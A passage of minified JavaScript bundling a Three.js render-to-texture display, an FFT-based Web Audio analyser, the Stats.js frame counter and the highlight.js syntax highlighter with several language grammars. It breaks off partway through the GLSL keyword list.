ThreeRTT.Display.prototype=_.extend(new THREE.Object3D,{make:function(){for(var a=this.n,b=this.gx,c=this.gy,e=this.targets,g=(b-1)/2,f=(c-1)/2,h=new THREE.PlaneGeometry(1,1,1,1),k=0,p=0;k<a&&p<c;++p)for(var m=0;k<a&&m<b;++m,++k){var t=new THREE.MeshBasicMaterial({color:16777215,map:ThreeRTT.toTexture(e[k]),fog:!1});t.side=THREE.DoubleSide;t=new THREE.Mesh(h,t);t.renderDepth=1E4+Math.random();this.add(t);1<b&&(t.position.x=-g+m);1<c&&(t.position.y=f-p)}}});
(function(){function a(a,b){this.bufferSize=a;this.sampleRate=b;this.bandwidth=2/a*b/2;this.spectrum=new Float32Array(a/2);this.real=new Float32Array(a);this.imag=new Float32Array(a);this.peak=this.peakBand=0;this.getBandFrequency=function(a){return this.bandwidth*a+this.bandwidth/2};this.calculateSpectrum=function(){for(var b=this.spectrum,e=this.real,h=this.imag,k=2/this.bufferSize,p=Math.sqrt,m,t,w=0,q=a/2;w<q;w++)m=e[w],t=h[w],m=k*p(m*m+t*t),m>this.peak&&(this.peakBand=w,this.peak=m),b[w]=m}}
function b(b,e){a.call(this,b,e);this.reverseTable=new Uint32Array(b);for(var g=1,f=b>>1,h;g<b;){for(h=0;h<g;h++)this.reverseTable[h+g]=this.reverseTable[h]+f;g<<=1;f>>=1}this.sinTable=new Float32Array(b);this.cosTable=new Float32Array(b);for(h=0;h<b;h++)this.sinTable[h]=Math.sin(-Math.PI/h),this.cosTable[h]=Math.cos(-Math.PI/h)}MicroEvent.mixin=function(a){for(var b=["bind","unbind","trigger"],g=0;g<b.length;g++)a.prototype[b[g]]=MicroEvent.prototype[b[g]]};"undefined"!==typeof module&&"exports"in
module&&(module.exports=MicroEvent);b.prototype.forward=function(a){var b=this.bufferSize,g=this.cosTable,f=this.sinTable,h=this.reverseTable,k=this.real,p=this.imag;if(Math.pow(2,Math.floor(Math.log(b)/Math.LN2))!==b)throw"Invalid buffer size, must be a power of 2.";if(b!==a.length)throw"Supplied buffer is not the same size as defined FFT. FFT Size: "+b+" Buffer Size: "+a.length;var m=1,t,w,q,y,r,z;for(z=0;z<b;z++)k[z]=a[h[z]],p[z]=0;for(;m<b;){a=g[m];h=f[m];t=1;for(var C=w=0;C<m;C++){for(z=C;z<
b;)q=z+m,y=t*k[q]-w*p[q],r=t*p[q]+w*k[q],k[q]=k[z]-y,p[q]=p[z]-r,k[z]+=y,p[z]+=r,z+=m<<1;z=t;t=z*a-w*h;w=z*h+w*a}m<<=1}return this.calculateSpectrum()};b.prototype.inverse=function(a,b){var g=this.bufferSize,f=this.cosTable,h=this.sinTable,k=this.reverseTable;a=a||this.real;b=b||this.imag;var p=1,m,t,w,q,y,r,z;for(z=0;z<g;z++)b[z]*=-1;m=new Float32Array(g);t=new Float32Array(g);for(z=0;z<a.length;z++)m[z]=a[k[z]],t[z]=b[k[z]];a=m;for(b=t;p<g;){k=f[p];m=h[p];t=1;for(var C=w=0;C<p;C++){for(z=C;z<g;)q=
z+p,y=t*a[q]-w*b[q],r=t*b[q]+w*a[q],a[q]=a[z]-y,b[q]=b[z]-r,a[z]+=y,b[z]+=r,z+=p<<1;z=t;t=z*k-w*m;w=z*m+w*k}p<<=1}f=new Float32Array(g);for(z=0;z<g;z++)f[z]=a[z]/g;return f};(function(a){for(var b in a)if(!window[b])throw"Error: ThreeAudio requires "+a[b];})({THREE:"Three.js",MicroEvent:"MicroEvent.js"});window.ThreeAudio=window.ThreeAudio||{};ThreeAudio.getShader=function(a){var b=document.getElementById(a);return b&&(b.innerText||b.textContent)||a};window._=window._||{};_.each=_.each||function(a,
b){if(a.forEach)return a.forEach(b);for(key in a)b(a[key],key,a)};_.extend=_.extend||function(a){_.each([].slice.call(arguments,1),function(b){for(var g in b)a[g]=b[g]});return a};MicroEvent.prototype.on=function(){MicroEvent.prototype.bind.apply(this,arguments);return this};MicroEvent.prototype.emit=function(){MicroEvent.prototype.trigger.apply(this,arguments);return this};MicroEvent.mixin=function(a){for(var b=["bind","unbind","trigger","on","emit"],g=0;g<b.length;g++)a.prototype[b[g]]=MicroEvent.prototype[b[g]]};
ThreeAudio.toTexture=function(a){return ThreeRTT&&ThreeRTT.toTexture&&ThreeRTT.toTexture(a)||a};ThreeAudio.Source=function(a,b){this.fftSize=a||1024;this.lowpass=22050;this.filters={};this.playing=!1;if(window.webkitAudioContext||window.mozAudioContext||window.AudioContext)this.initElement(b);else throw"Web Audio API not supported";};ThreeAudio.Source.prototype={initElement:function(a){this.context=new (window.webkitAudioContext||window.mozAudioContext||window.AudioContext);a?this.element=a:(this.element=
new Audio,this.element.preload="auto");this.element.addEventListener("canplay",function(){this.initAnalyzer()}.bind(this))},initAnalyzer:function(){var a=this.context;this.source=a.createMediaElementSource(this.element);this.analyser=a.createAnalyser();var b=this.analyser.fftSize=this.fftSize,g=this.filters;_.each({bass:{type:0,frequency:160,Q:1.2,gain:2},mid:{type:2,frequency:500,Q:1.2,gain:4},treble:{type:1,frequency:2E3,Q:1.2,gain:3}},function(f,h){var q=a.createBiquadFilter();q.key=h;q.type=f.type;
q.frequency.value=f.frequency;q.Q.value=f.Q;q.analyser=a.createAnalyser();q.analyser.fftSize=b;q.delayNode=a.createDelay();q.delayNode.delayTime.value=0;q.gainNode=a.createGain();q.gainNode.gain.value=f.gain;g[h]=q});this.outputFilter=a.createBiquadFilter();this.outputFilter.type=0;this.outputFilter.frequency.value=this.lowpass;this.outputFilter.Q.value=1.2;for(var f=a.createBuffer(2,256,a.sampleRate),h=0;2>h;++h)for(var k=f.getChannelData(h),p=0;256>p;p+=Math.floor(5*Math.random()+1))k[p]=p?Math.random()*
Math.exp(-p/256):1;this.reverb=a.createConvolver();this.reverb.buffer=f;this.delay=a.createDelay();this.delay.delayTime.value=2*this.fftSize/a.sampleRate;this.source.connect(this.analyser);this.analyser.connect(this.delay);this.delay.connect(a.destination);var m=this.source;_.each(g,function(a){m.connect(a.delayNode);a.delayNode.connect(a);a.connect(a.gainNode);a.gainNode.connect(a.analyser)});this.samples=this.analyser.frequencyBinCount;this.data={freq:new Uint8Array(this.samples),time:new Uint8Array(this.samples),
filter:{bass:new Uint8Array(this.samples),mid:new Uint8Array(this.samples),treble:new Uint8Array(this.samples)}}},update:function(){var a=this.analyser,b=this.data;a&&(a.smoothingTimeConstant=0,a.getByteFrequencyData(b.freq),a.getByteTimeDomainData(b.time),_.each(this.filters,function(a){a.analyser.getByteTimeDomainData(b.filter[a.key])}));return this},size:function(){return this.analyser.frequencyBinCount},load:function(a,b){var g=this,f=function(){g.playing&&g._play();g.element.removeEventListener("canplaythrough",
f);b&&b()};this.element.addEventListener("canplaythrough",f);this.element.src=a;return this},play:function(){this.playing=!0;4==this.element.readyState&&this._play();return this},stop:function(){this.playing=!1;4==this.element.readyState&&this._stop();return this},_play:function(){this.element.play()},_stop:function(){this.element.pause()}}})();
var Stats=function(){var a=Date.now(),b=a,c=0,e=Infinity,g=0,f=0,h=Infinity,k=0,p=0,m=0,t=document.createElement("div");t.id="stats";t.addEventListener("mousedown",function(a){a.preventDefault();D(++m%2)},!1);t.style.cssText="width:80px;opacity:0.9;cursor:pointer";var w=document.createElement("div");w.id="fps";w.style.cssText="padding:0 0 3px 3px;text-align:left;background-color:#002";t.appendChild(w);var q=document.createElement("div");q.id="fpsText";q.style.cssText="color:#0ff;font-family:Helvetica,Arial,sans-serif;font-size:9px;font-weight:bold;line-height:15px";
q.innerHTML="FPS";w.appendChild(q);var y=document.createElement("div");y.id="fpsGraph";y.style.cssText="position:relative;width:74px;height:30px;background-color:#0ff";for(w.appendChild(y);74>y.children.length;){var r=document.createElement("span");r.style.cssText="width:1px;height:30px;float:left;background-color:#113";y.appendChild(r)}var z=document.createElement("div");z.id="ms";z.style.cssText="padding:0 0 3px 3px;text-align:left;background-color:#020;display:none";t.appendChild(z);var C=document.createElement("div");
C.id="msText";C.style.cssText="color:#0f0;font-family:Helvetica,Arial,sans-serif;font-size:9px;font-weight:bold;line-height:15px";C.innerHTML="MS";z.appendChild(C);var B=document.createElement("div");B.id="msGraph";B.style.cssText="position:relative;width:74px;height:30px;background-color:#0f0";for(z.appendChild(B);74>B.children.length;)r=document.createElement("span"),r.style.cssText="width:1px;height:30px;float:left;background-color:#131",B.appendChild(r);var D=function(a){m=a;switch(m){case 0:w.style.display=
"block";z.style.display="none";break;case 1:w.style.display="none",z.style.display="block"}};return{REVISION:11,domElement:t,setMode:D,begin:function(){a=Date.now()},end:function(){var r=Date.now();c=r-a;e=Math.min(e,c);g=Math.max(g,c);C.textContent=c+" MS ("+e+"-"+g+")";var m=Math.min(30,30-c/200*30);B.appendChild(B.firstChild).style.height=m+"px";p++;r>b+1E3&&(f=Math.round(1E3*p/(r-b)),h=Math.min(h,f),k=Math.max(k,f),q.textContent=f+" FPS ("+h+"-"+k+")",m=Math.min(30,30-f/100*30),y.appendChild(y.firstChild).style.height=
m+"px",b=r,p=0);return r},update:function(){a=this.end()}}};
THREE.RoundRectGeometry=function(a,b,c,e,g){function f(a,b,c){var e=new THREE.Face3(a,b,c);e.normal.copy(m);e.vertexNormals.push(m.clone(),m.clone(),m.clone());a=r[a];b=r[b];c=r[c];z.push(e);C[0].push([new THREE.Vector2(a.x*B+.5,g*a.y*D+.5),new THREE.Vector2(b.x*B+.5,g*b.y*D+.5),new THREE.Vector2(c.x*B+.5,g*c.y*D+.5)])}function h(a,b,c,e){var g=new THREE.Face4(a,b,c,e);g.normal.copy(m);g.vertexNormals.push(m.clone(),m.clone(),m.clone(),m.clone());a=r[a];b=r[b];c=r[c];e=r[e];z.push(g);C[0].push([new THREE.Vector2(a.x*
B+.5,a.y*D+.5),new THREE.Vector2(b.x*B+.5,b.y*D+.5),new THREE.Vector2(c.x*B+.5,c.y*D+.5),new THREE.Vector2(e.x*B+.5,e.y*D+.5)])}THREE.Geometry.call(this);this.width=a=a||1;this.height=b=b||1;this.radius=c=c||.25;this.segments=e=Math.max(1,e||5);for(var k=a/2,p=b/2,m=new THREE.Vector3(0,0,1),t=[1,1,-1,1,-1,-1,1,-1],w=0;4>w;++w)this.vertices.push(new THREE.Vector3((k-c)*t[2*w],(p-c)*t[2*w+1]));k=Math.PI/2/e;for(w=0;4>w;++w)for(var t=this.vertices[w],p=t.x,q=t.y,y=w*Math.PI/2,t=0;t<=e;++t)this.vertices.push(new THREE.Vector3(Math.cos(y)*
c+p,Math.sin(y)*c+q)),y+=k;var r=this.vertices,z=this.faces,C=this.faceVertexUvs,B=1/a,D=1/b;h(0,1,2,3);a=e+1;b=4*a;for(w=0;4>w;++w)c=(w+1)*a,h((w+1)%4,w,4+(c-1)%b,4+c%b);for(w=0;4>w;++w)for(t=0;t<e;++t)f(w,4+w*a+t,4+w*a+t+1);this.computeCentroids()};THREE.RoundRectGeometry.prototype=Object.create(THREE.Geometry.prototype);
!function(a){"undefined"!=typeof exports?a(exports):(window.hljs=a({}),"function"==typeof define&&define.amd&&define("hljs",[],function(){return window.hljs}))}(function(a){function b(a){return a.replace(/&/gm,"&amp;").replace(/</gm,"&lt;").replace(/>/gm,"&gt;")}function c(a,b){var c=a&&a.exec(b);return c&&0==c.index}function e(a){return/^(no-?highlight|plain|text)$/i.test(a)}function g(a,b){var c,e={};for(c in a)e[c]=a[c];if(b)for(c in b)e[c]=b[c];return e}function f(a){var b=[];return function W(a,
c){for(var e=a.firstChild;e;e=e.nextSibling)3==e.nodeType?c+=e.nodeValue.length:1==e.nodeType&&(b.push({event:"start",offset:c,node:e}),c=W(e,c),e.nodeName.toLowerCase().match(/br|hr|img|input/)||b.push({event:"stop",offset:c,node:e}));return c}(a,0),b}function h(a,c,e){function g(){return a.length&&c.length?a[0].offset!=c[0].offset?a[0].offset<c[0].offset?a:c:"start"==c[0].event?a:c:a.length?a:c}function f(a){r+="<"+a.nodeName.toLowerCase()+Array.prototype.map.call(a.attributes,function(a){return" "+
a.nodeName+'="'+b(a.value)+'"'}).join("")+">"}function h(a){r+="</"+a.nodeName.toLowerCase()+">"}function q(a){("start"==a.event?f:h)(a.node)}for(var k=0,r="",m=[];a.length||c.length;){var p=g();if(r+=b(e.substr(k,p[0].offset-k)),k=p[0].offset,p==a){m.reverse().forEach(h);do q(p.splice(0,1)[0]),p=g();while(p==a&&p.length&&p[0].offset==k);m.reverse().forEach(f)}else"start"==p[0].event?m.push(p[0].node):m.pop(),q(p.splice(0,1)[0])}return r+b(e.substr(k))}function k(a){function b(a){return a&&a.source||
a}function c(e,g){return new RegExp(b(e),"m"+(a.cI?"i":"")+(g?"g":""))}function e(f,h){if(!f.compiled){if(f.compiled=!0,f.k=f.k||f.bK,f.k){var q={},k=function(b,c){a.cI&&(c=c.toLowerCase());c.split(" ").forEach(function(a){a=a.split("|");q[a[0]]=[b,a[1]?Number(a[1]):1]})};"string"==typeof f.k?k("keyword",f.k):Object.keys(f.k).forEach(function(a){k(a,f.k[a])});f.k=q}f.lR=c(f.l||/\b\w+\b/,!0);h&&(f.bK&&(f.b="\\b("+f.bK.split(" ").join("|")+")\\b"),f.b||(f.b=/\B|\b/),f.bR=c(f.b),f.e||f.eW||(f.e=/\B|\b/),
f.e&&(f.eR=c(f.e)),f.tE=b(f.e)||"",f.eW&&h.tE&&(f.tE+=(f.e?"|":"")+h.tE));f.i&&(f.iR=c(f.i));void 0===f.r&&(f.r=1);f.c||(f.c=[]);var r=[];f.c.forEach(function(a){a.v?a.v.forEach(function(b){r.push(g(a,b))}):r.push("self"==a?f:a)});f.c=r;f.c.forEach(function(a){e(a,f)});f.starts&&e(f.starts,h);var m=f.c.map(function(a){return a.bK?"\\.?("+a.b+")\\.?":a.b}).concat([f.tE,f.i]).map(b).filter(Boolean);f.t=m.length?c(m.join("|"),!0):{exec:function(){return null}}}}e(a)}function p(a,e,g,f){function h(a,
b){if(c(a.eR,b)){for(;a.endsParent&&a.parent;)a=a.parent;return a}return a.eW?h(a.parent,b):void 0}function q(a,b,c,e){e='<span class="'+(e?"":r.classPrefix);return e+=a+'">',e+b+(c?"":"</span>")}function t(){var a;if(void 0!==J.sL)if((a="string"==typeof J.sL)&&!z[J.sL])a=b(H);else{var c=a?p(J.sL,H,!0,M[J.sL]):m(H,J.sL.length?J.sL:void 0);a=(0<J.r&&(Z+=c.r),a&&(M[J.sL]=c.top),q(c.language,c.value,!1,!0))}else if(J.k){a="";var e=0;J.lR.lastIndex=0;for(c=J.lR.exec(H);c;){a+=b(H.substr(e,c.index-e));
var e=J,g=c,g=I.cI?g[0].toLowerCase():g[0];(e=e.k.hasOwnProperty(g)&&e.k[g])?(Z+=e[1],a+=q(e[0],b(c[0]))):a+=b(c[0]);e=J.lR.lastIndex;c=J.lR.exec(H)}a+=b(H.substr(e))}else a=b(H);return a}function w(a,c){var e=a.cN?q(a.cN,"",!0):"";a.rB?(T+=e,H=""):a.eB?(T+=b(c)+e,H=""):(T+=e,H=c);J=Object.create(a,{parent:{value:J}})}function C(a,e){if(H+=a,void 0===e)return T+=t(),0;var f;a:{f=J;for(var q=0;q<f.c.length;q++)if(c(f.c[q].bR,e)){f=f.c[q];break a}f=void 0}if(f)return T+=t(),w(f,e),f.rB?0:e.length;if(f=
h(J,e)){q=J;q.rE||q.eE||(H+=e);T+=t();do J.cN&&(T+="</span>"),Z+=J.r,J=J.parent;while(J!=f.parent);return q.eE&&(T+=b(e)),H="",f.starts&&w(f.starts,""),q.rE?0:e.length}if(!g&&c(J.iR,e))throw Error('Illegal lexeme "'+e+'" for mode "'+(J.cN||"<unnamed>")+'"');return H+=e,e.length||1}var I=y(a);if(!I)throw Error('Unknown language: "'+a+'"');k(I);var J=f||I,M={},T="";for(f=J;f!=I;f=f.parent)f.cN&&(T=q(f.cN,"",!0)+T);var H="",Z=0;try{for(var Y,X,V=0;J.t.lastIndex=V,Y=J.t.exec(e),Y;)X=C(e.substr(V,Y.index-
V),Y[0]),V=Y.index+X;C(e.substr(V));for(f=J;f.parent;f=f.parent)f.cN&&(T+="</span>");return{r:Z,value:T,language:a,top:J}}catch(ja){if(-1!=ja.message.indexOf("Illegal"))return{r:0,value:b(e)};throw ja;}}function m(a,c){c=c||r.languages||Object.keys(z);var e={r:0,value:b(a)},g=e;return c.forEach(function(b){if(y(b)){var c=p(b,a,!1);c.language=b;c.r>g.r&&(g=c);c.r>e.r&&(g=e,e=c)}}),g.language&&(e.second_best=g),e}function t(a){return r.tabReplace&&(a=a.replace(/^((<[^>]+>|\t)+)/gm,function(a,b){return b.replace(/\t/g,
r.tabReplace)})),r.useBR&&(a=a.replace(/\n/g,"<br>")),a}function w(a){var b;a:{var c,g=a.className+" ";if(g+=a.parentNode?a.parentNode.className:"",b=/\blang(?:uage)?-([\w-]+)\b/i.exec(g))b=y(b[1])?b[1]:"no-highlight";else{g=g.split(/\s+/);b=0;for(c=g.length;c>b;b++)if(y(g[b])||e(g[b])){b=g[b];break a}b=void 0}}if(!e(b)){var q;r.useBR?(q=document.createElementNS("http://www.w3.org/1999/xhtml","div"),q.innerHTML=a.innerHTML.replace(/\n/g,"").replace(/<br[ \/]*>/g,"\n")):q=a;c=q.textContent;g=b?p(b,
c,!0):m(c);q=f(q);if(q.length){var k=document.createElementNS("http://www.w3.org/1999/xhtml","div");k.innerHTML=g.value;g.value=h(q,f(k),c)}g.value=t(g.value);a.innerHTML=g.value;q=a.className;b=b?C[b]:g.language;c=[q.trim()];q=(q.match(/\bhljs\b/)||c.push("hljs"),-1===q.indexOf(b)&&c.push(b),c.join(" ").trim());a.className=q;a.result={language:g.language,re:g.r};g.second_best&&(a.second_best={language:g.second_best.language,re:g.second_best.r})}}function q(){if(!q.called){q.called=!0;var a=document.querySelectorAll("pre code");
Array.prototype.forEach.call(a,w)}}function y(a){return a=a.toLowerCase(),z[a]||z[C[a]]}var r={classPrefix:"hljs-",tabReplace:null,useBR:!1,languages:void 0},z={},C={};return a.highlight=p,a.highlightAuto=m,a.fixMarkup=t,a.highlightBlock=w,a.configure=function(a){r=g(r,a)},a.initHighlighting=q,a.initHighlightingOnLoad=function(){addEventListener("DOMContentLoaded",q,!1);addEventListener("load",q,!1)},a.registerLanguage=function(b,c){var e=z[b]=c(a);e.aliases&&e.aliases.forEach(function(a){C[a]=b})},
a.listLanguages=function(){return Object.keys(z)},a.getLanguage=y,a.inherit=g,a.IR="[a-zA-Z]\\w*",a.UIR="[a-zA-Z_]\\w*",a.NR="\\b\\d+(\\.\\d+)?",a.CNR="(\\b0[xX][a-fA-F0-9]+|(\\b\\d+(\\.\\d*)?|\\.\\d+)([eE][-+]?\\d+)?)",a.BNR="\\b(0b[01]+)",a.RSR="!|!=|!==|%|%=|&|&&|&=|\\*|\\*=|\\+|\\+=|,|-|-=|/=|/|:|;|<<|<<=|<=|<|===|==|=|>>>=|>>=|>=|>>>|>>|>|\\?|\\[|\\{|\\(|\\^|\\^=|\\||\\|=|\\|\\||~",a.BE={b:"\\\\[\\s\\S]",r:0},a.ASM={cN:"string",b:"'",e:"'",i:"\\n",c:[a.BE]},a.QSM={cN:"string",b:'"',e:'"',i:"\\n",
c:[a.BE]},a.PWM={b:/\b(a|an|the|are|I|I'm|isn't|don't|doesn't|won't|but|just|should|pretty|simply|enough|gonna|going|wtf|so|such)\b/},a.C=function(b,c,e){b=a.inherit({cN:"comment",b:b,e:c,c:[]},e||{});return b.c.push(a.PWM),b.c.push({cN:"doctag",b:"(?:TODO|FIXME|NOTE|BUG|XXX):",r:0}),b},a.CLCM=a.C("//","$"),a.CBCM=a.C("/\\*","\\*/"),a.HCM=a.C("#","$"),a.NM={cN:"number",b:a.NR,r:0},a.CNM={cN:"number",b:a.CNR,r:0},a.BNM={cN:"number",b:a.BNR,r:0},a.CSSNM={cN:"number",b:a.NR+"(%|em|ex|ch|rem|vw|vh|vmin|vmax|cm|mm|in|pt|pc|px|deg|grad|rad|turn|s|ms|Hz|kHz|dpi|dpcm|dppx)?",
r:0},a.RM={cN:"regexp",b:/\//,e:/\/[gimuy]*/,i:/\n/,c:[a.BE,{b:/\[/,e:/\]/,r:0,c:[a.BE]}]},a.TM={cN:"title",b:a.IR,r:0},a.UTM={cN:"title",b:a.UIR,r:0},a});
hljs.registerLanguage("bash",function(a){var b={cN:"variable",v:[{b:/\$[\w\d#@][\w\d_]*/},{b:/\$\{(.*?)}/}]},c={cN:"string",b:/"/,e:/"/,c:[a.BE,b,{cN:"variable",b:/\$\(/,e:/\)/,c:[a.BE]}]};return{aliases:["sh","zsh"],l:/-?[a-z\.]+/,k:{keyword:"if then else elif fi for while in do done case esac function",literal:"true false",built_in:"break cd continue eval exec exit export getopts hash pwd readonly return shift test times trap umask unset alias bind builtin caller command declare echo enable help let local logout mapfile printf read readarray source type typeset ulimit unalias set shopt autoload bg bindkey bye cap chdir clone comparguments compcall compctl compdescribe compfiles compgroups compquote comptags comptry compvalues dirs disable disown echotc echoti emulate fc fg float functions getcap getln history integer jobs kill limit log noglob popd print pushd pushln rehash sched setcap setopt stat suspend ttyctl unfunction unhash unlimit unsetopt vared wait whence where which zcompile zformat zftp zle zmodload zparseopts zprof zpty zregexparse zsocket zstyle ztcp",operator:"-ne -eq -lt -gt -f -d -e -s -l -a"},
c:[{cN:"shebang",b:/^#![^\n]+sh\s*$/,r:10},{cN:"function",b:/\w[\w\d_]*\s*\(\s*\)\s*\{/,rB:!0,c:[a.inherit(a.TM,{b:/\w[\w\d_]*/})],r:0},a.HCM,a.NM,c,{cN:"string",b:/'/,e:/'/},b]}});
hljs.registerLanguage("css",function(a){var b={cN:"function",b:"[a-zA-Z-][a-zA-Z0-9_-]*\\(",rB:!0,eE:!0,e:"\\("},c={cN:"rule",b:/[A-Z\_\.\-]+\s*:/,rB:!0,e:";",eW:!0,c:[{cN:"attribute",b:/\S/,e:":",eE:!0,starts:{cN:"value",eW:!0,eE:!0,c:[b,a.CSSNM,a.QSM,a.ASM,a.CBCM,{cN:"hexcolor",b:"#[0-9A-Fa-f]+"},{cN:"important",b:"!important"}]}}]};return{cI:!0,i:/[=\/|'\$]/,c:[a.CBCM,c,{cN:"id",b:/\#[A-Za-z0-9_-]+/},{cN:"class",b:/\.[A-Za-z0-9_-]+/},{cN:"attr_selector",b:/\[/,e:/\]/,i:"$"},{cN:"pseudo",b:/:(:)?[a-zA-Z0-9\_\-\+\(\)"']+/},
{cN:"at_rule",b:"@(font-face|page)",l:"[a-z-]+",k:"font-face page"},{cN:"at_rule",b:"@",e:"[{;]",c:[{cN:"keyword",b:/\S+/},{b:/\s/,eW:!0,eE:!0,r:0,c:[b,a.ASM,a.QSM,a.CSSNM]}]},{cN:"tag",b:"[a-zA-Z-][a-zA-Z0-9_-]*",r:0},{cN:"rules",b:"{",e:"}",i:/\S/,c:[a.CBCM,c]}]}});
hljs.registerLanguage("cpp",function(a){var b={cN:"keyword",b:"\\b[a-z\\d_]*_t\\b"},c={cN:"string",v:[a.inherit(a.QSM,{b:'((u8?|U)|L)?"'}),{b:'(u8?|U)?R"',e:'"',c:[a.BE]},{b:"'\\\\?.",e:"'",i:"."}]},e={cN:"number",v:[{b:"\\b(\\d+(\\.\\d*)?|\\.\\d+)(u|U|l|L|ul|UL|f|F)"},{b:a.CNR}]},g={cN:"preprocessor",b:"#",e:"$",k:"if else elif endif define undef warning error line pragma ifdef ifndef",c:[{b:/\\\n/,r:0},{bK:"include",e:"$",c:[c,{cN:"string",b:"<",e:">",i:"\\n"}]},c,e,a.CLCM,a.CBCM]},f=a.IR+"\\s*\\(",
h={keyword:"int float while private char catch export virtual operator sizeof dynamic_cast|10 typedef const_cast|10 const struct for static_cast|10 union namespace unsigned long volatile static protected bool template mutable if public friend do goto auto void enum else break extern using class asm case typeid short reinterpret_cast|10 default double register explicit signed typename try this switch continue inline delete alignof constexpr decltype noexcept static_assert thread_local restrict _Bool complex _Complex _Imaginary atomic_bool atomic_char atomic_schar atomic_uchar atomic_short atomic_ushort atomic_int atomic_uint atomic_long atomic_ulong atomic_llong atomic_ullong",
built_in:"std string cin cout cerr clog stdin stdout stderr stringstream istringstream ostringstream auto_ptr deque list queue stack vector map set bitset multiset multimap unordered_set unordered_map unordered_multiset unordered_multimap array shared_ptr abort abs acos asin atan2 atan calloc ceil cosh cos exit exp fabs floor fmod fprintf fputs free frexp fscanf isalnum isalpha iscntrl isdigit isgraph islower isprint ispunct isspace isupper isxdigit tolower toupper labs ldexp log10 log malloc realloc memchr memcmp memcpy memset modf pow printf putchar puts scanf sinh sin snprintf sprintf sqrt sscanf strcat strchr strcmp strcpy strcspn strlen strncat strncmp strncpy strpbrk strrchr strspn strstr tanh tan vfprintf vprintf vsprintf",
literal:"true false nullptr NULL"};return{aliases:"c cc h c++ h++ hpp".split(" "),k:h,i:"</",c:[b,a.CLCM,a.CBCM,e,c,g,{b:"\\b(deque|list|queue|stack|vector|map|set|bitset|multiset|multimap|unordered_map|unordered_set|unordered_multiset|unordered_multimap|array)\\s*<",e:">",k:h,c:["self",b]},{b:a.IR+"::",k:h},{bK:"new throw return else",r:0},{cN:"function",b:"("+a.IR+"[\\*&\\s]+)+"+f,rB:!0,e:/[{;=]/,eE:!0,k:h,i:/[^\w\s\*&]/,c:[{b:f,rB:!0,c:[a.TM],r:0},{cN:"params",b:/\(/,e:/\)/,k:h,r:0,c:[a.CLCM,a.CBCM,
c,e]},a.CLCM,a.CBCM,g]}]}});
hljs.registerLanguage("swift",function(a){var b={keyword:"class deinit enum extension func init let protocol static struct subscript typealias var break case continue default do else fallthrough if in for return switch where while as dynamicType is new super self Self Type __COLUMN__ __FILE__ __FUNCTION__ __LINE__ associativity didSet get infix inout left mutating none nonmutating operator override postfix precedence prefix right set unowned unowned safe unsafe weak willSet",literal:"true false nil",
built_in:"abs advance alignof alignofValue assert bridgeFromObjectiveC bridgeFromObjectiveCUnconditional bridgeToObjectiveC bridgeToObjectiveCUnconditional c contains count countElements countLeadingZeros debugPrint debugPrintln distance dropFirst dropLast dump encodeBitsAsWords enumerate equal filter find getBridgedObjectiveCType getVaList indices insertionSort isBridgedToObjectiveC isBridgedVerbatimToObjectiveC isUniquelyReferenced join lexicographicalCompare map max maxElement min minElement numericCast partition posix print println quickSort reduce reflect reinterpretCast reverse roundUpToAlignment sizeof sizeofValue sort split startsWith strideof strideofValue swap swift toString transcode underestimateCount unsafeReflect withExtendedLifetime withObjectAtPlusZero withUnsafePointer withUnsafePointerToObject withUnsafePointers withVaList"},
c=a.C("/\\*","\\*/",{c:["self"]}),e={cN:"subst",b:/\\\(/,e:"\\)",k:b,c:[]},g={cN:"number",b:"\\b([\\d_]+(\\.[\\deE_]+)?|0x[a-fA-F0-9_]+(\\.[a-fA-F0-9p_]+)?|0b[01_]+|0o[0-7_]+)\\b",r:0},f=a.inherit(a.QSM,{c:[e,a.BE]});return e.c=[g],{k:b,c:[f,a.CLCM,c,{cN:"type",b:"\\b[A-Z][\\w']*",r:0},g,{cN:"func",bK:"func",e:"{",eE:!0,c:[a.inherit(a.TM,{b:/[A-Za-z$_][0-9A-Za-z$_]*/,i:/\(/}),{cN:"generics",b:/</,e:/>/,i:/>/},{cN:"params",b:/\(/,e:/\)/,endsParent:!0,k:b,c:["self",g,f,a.CBCM,{b:":"}],i:/["']/}],i:/\[|%/},
{cN:"class",bK:"struct protocol class extension enum",k:b,e:"\\{",eE:!0,c:[a.inherit(a.TM,{b:/[A-Za-z$_][0-9A-Za-z$_]*/})]},{cN:"preprocessor",b:"(@assignment|@class_protocol|@exported|@final|@lazy|@noreturn|@NSCopying|@NSManaged|@objc|@optional|@required|@auto_closure|@noreturn|@IBAction|@IBDesignable|@IBInspectable|@IBOutlet|@infix|@prefix|@postfix)"},{bK:"import",e:/$/,c:[a.CLCM,c]}]}});
hljs.registerLanguage("markdown",function(a){return{aliases:["md","mkdown","mkd"],c:[{cN:"header",v:[{b:"^#{1,6}",e:"$"},{b:"^.+?\\n[=-]{2,}$"}]},{b:"<",e:">",sL:"xml",r:0},{cN:"bullet",b:"^([*+-]|(\\d+\\.))\\s+"},{cN:"strong",b:"[*_]{2}.+?[*_]{2}"},{cN:"emphasis",v:[{b:"\\*.+?\\*"},{b:"_.+?_",r:0}]},{cN:"blockquote",b:"^>\\s+",e:"$"},{cN:"code",v:[{b:"`.+?`"},{b:"^( {4}|\t)",e:"$",r:0}]},{cN:"horizontal_rule",b:"^[-\\*]{3,}",e:"$"},{b:"\\[.+?\\][\\(\\[].*?[\\)\\]]",rB:!0,c:[{cN:"link_label",b:"\\[",
e:"\\]",eB:!0,rE:!0,r:0},{cN:"link_url",b:"\\]\\(",e:"\\)",eB:!0,eE:!0},{cN:"link_reference",b:"\\]\\[",e:"\\]",eB:!0,eE:!0}],r:10},{b:"^\\[.+\\]:",rB:!0,c:[{cN:"link_reference",b:"\\[",e:"\\]:",eB:!0,eE:!0,starts:{cN:"link_url",e:"$"}}]}]}});
hljs.registerLanguage("glsl",function(a){return{k:{keyword:"atomic_uint attribute bool break bvec2 bvec3 bvec4 case centroid coherent const continue default discard dmat2 dmat2x2 dmat2x3 dmat2x4 dmat3 dmat3x2 dmat3x3 dmat3x4 dmat4 dmat4x2 dmat4x3 dmat4x4 do double dvec2 dvec3 dvec4 else flat float for highp if iimage1D iimage1DArray iimage2D iimage2DArray iimage2DMS iimage2DMSArray iimage2DRect iimage3D iimageBuffer iimageCube iimageCubeArray image1D image1DArray image2D image2DArray image2DMS image2DMSArray image2DRect image3D imageBuffer imageCube imageCubeArray in inout int invariant isampler1D isampler1DArray isampler2D isampler2DArray isampler2DMS isampler2DMSArray isampler2DRect isampler3D isamplerBuffer isamplerCube isamplerCubeArray ivec2 ivec3 ivec4 layout lowp mat2 mat2x2 mat2x3 mat2x4 mat3 mat3x2 mat3x3 mat3x4 